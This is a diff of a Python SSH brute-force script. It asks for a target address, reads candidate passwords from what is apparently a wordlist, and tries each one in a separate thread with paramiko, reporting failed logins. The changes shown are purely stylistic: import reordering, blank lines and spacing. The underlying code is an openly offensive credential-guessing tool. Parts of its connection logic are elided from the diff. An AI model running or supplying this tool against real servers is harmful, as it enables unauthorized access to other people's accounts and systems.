@@ -1,7 +1,13 @@
-import paramiko, sys, os, termcolor
-import threading, time
+import threading
+import time
+
+import os
+import paramiko
+import sys
+import termcolor
 
 stop_flag = 0
+
 
 def ssh_connect(host, username, password):
     global stop_flag
@@ -15,6 +21,7 @@ def ssh_connect(host, username, password):
         print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
     finally:
         ssh.close()
+
 
 if __name__ == '__main__':
     host = input('[+] Target Address: ')
@@ -34,6 +41,6 @@ if __name__ == '__main__':
                 t.join()
                 exit()
             password = line.strip()
-            t = threading.Thread(target=ssh_connect, args=(host,username,password,))
+            t = threading.Thread(target=ssh_connect, args=(host, username, password,))
             t.start()
             time.sleep(0.5)
